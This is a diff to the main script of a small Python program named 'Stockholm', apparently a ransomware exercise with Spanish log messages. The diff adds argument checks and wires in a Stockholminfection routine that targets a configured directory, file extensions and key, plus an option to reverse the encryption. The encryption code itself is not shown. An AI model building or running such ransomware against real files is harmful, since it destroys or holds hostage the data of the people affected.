@@ -2,6 +2,7 @@
 import sys
 from logger import Stockholmlogger
 from config_functions import Configlibrary
+from stockholm import Stockholminfection
 
 def main():
     """main function of the program"""
@@ -9,20 +10,22 @@ def main():
     st_logger = Stockholmlogger()
     st_logger.set_log_level(config.get_log_level())
 
-    if sys.argv[1] == "-s":
+    if len(sys.argv) > 1 and sys.argv[1] == "-s":
         config.set_log_level("NOTSET")
         st_logger.logger.propagate = False
-    if sys.argv[1] == "-h":
+    if len(sys.argv) > 1 and sys.argv[1] == "-h":
         st_logger.logger.info("imprimiendo manual de ayuda")
-    elif sys.argv[1] == "-v":
+    elif len(sys.argv) > 1 and sys.argv[1] == "-v":
         st_logger.logger.info(config.get_program_version())
-    elif sys.argv[1] == "-r":
+    elif len(sys.argv) > 1 and sys.argv[1] == "-r":
         if sys.argv[2]:
             st_logger.logger.info("gracias por la clave")
         else:
             st_logger.logger.error("no puedo revertir el cifrado si no me das la clave")
     else:
-        print("a hacer cositas")
+        stockholm = Stockholminfection(st_logger, config.get_infection_dir(),
+                    config.get_infection_extensions(), config.get_infection_key())
+        stockholm.run()
 
 if __name__ == "__main__":
     main()
